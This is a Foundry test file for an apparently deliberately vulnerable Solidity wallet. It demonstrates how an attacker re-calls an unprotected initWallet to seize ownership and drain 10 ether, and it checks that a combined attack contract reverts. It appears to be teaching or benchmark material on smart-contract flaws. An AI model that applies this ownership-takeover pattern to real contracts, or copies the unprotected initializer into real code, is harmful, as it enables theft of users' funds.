pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/6.1.6-Transfer-Recipient-Depending-on-Transaction-Order-vulnerability.sol";

contract TransferRecipientVulnTest is Test {
    OwnableWallet public wallet;
    address public victim = address(0xBEEF);
    address public attacker = address(0xCAFE);

    // initial amount funded to the wallet
    uint256 public constant INITIAL_FUND = 10 ether;

    // record attacker balance before the attack for sanity check
    uint256 attackerBalanceBefore;

    function setUp() public {
        // Deploy vulnerable wallet
        wallet = new OwnableWallet();

        // Initialize wallet setting owner as victim
        vm.prank(victim);
        wallet.initWallet(payable(victim));

        // Fund the wallet with INITIAL_FUND from victim
        vm.deal(victim, 20 ether);
        vm.prank(victim);
        (bool sent, ) = payable(address(wallet)).call{value: INITIAL_FUND}('');
        require(sent, "Funding failed");

        // Record attacker initial balance
        attackerBalanceBefore = attacker.balance;
    }

    // This test demonstrates that an attacker can exploit the vulnerability by
    // calling initWallet with his own address before withdrawing funds, all within the same block ordering.
    function testAttackRaceCondition() public {
        // Before attack, ensure wallet balance is as expected and owner is victim
        assertEq(address(wallet).balance, INITIAL_FUND);
        assertEq(wallet.owner(), victim);

        // -------- Exploit Simulation --------
        // In a real-world scenario, two transactions in the same block could be ordered so that
        // the attacker first updates the wallet owner then immediately withdraws funds.

        // Transaction 1: Attacker calls initWallet reassigning the owner to himself
        vm.prank(attacker);
        wallet.initWallet(payable(attacker));
        // Now, wallet.owner() should be the attacker
        assertEq(wallet.owner(), attacker);

        // Transaction 2: Now that the owner is attacker, he can withdraw the funds.
        vm.prank(attacker);
        wallet.withdraw(address(wallet).balance);

        // -------- End of Exploit Simulation --------

        // Check that the wallet balance is drained
        assertEq(address(wallet).balance, 0);

        // Check that the attacker's balance increased by the initial fund amount
        // (ignoring gas cost differences in the testing framework)
        uint256 attackerBalanceAfter = attacker.balance;
        assertGe(attackerBalanceAfter, attackerBalanceBefore + INITIAL_FUND);
    }

    // The provided AttackContract is intended to combine the two steps in one call.
    // However, due to Solidity's msg.sender semantics, when calling from a contract,
    // the msg.sender in withdraw() becomes the contract's address rather than the attacker's EOA.
    // This test confirms that the AttackContract attack() call will revert due to the owner check.
    function testAttackViaAttackContractFailsDueToMsgSenderMismatch() public {
        // Deploy the attack contract, deployed by attacker
        vm.prank(attacker);
        AttackContract attackerContract = new AttackContract(address(wallet));

        // Reset the wallet: send some ether
        vm.deal(victim, 20 ether);
        vm.prank(victim);
        (bool sent, ) = payable(address(wallet)).call{value: INITIAL_FUND}('');
        require(sent, "Funding failed");

        // The attack contractâ€™s attack() will do the following:
        //   1. Call initWallet(payable(msg.sender)) where msg.sender is the EOA attacker,
        //      so wallet.owner becomes attacker.
        //   2. Immediately call withdraw() from the AttackContract, making msg.sender the attack contract.
        // This should fail the require(msg.sender == owner) check in withdraw().

        vm.prank(attacker);
        vm.expectRevert("Only owner can withdraw");
        attackerContract.attack();
    }
}
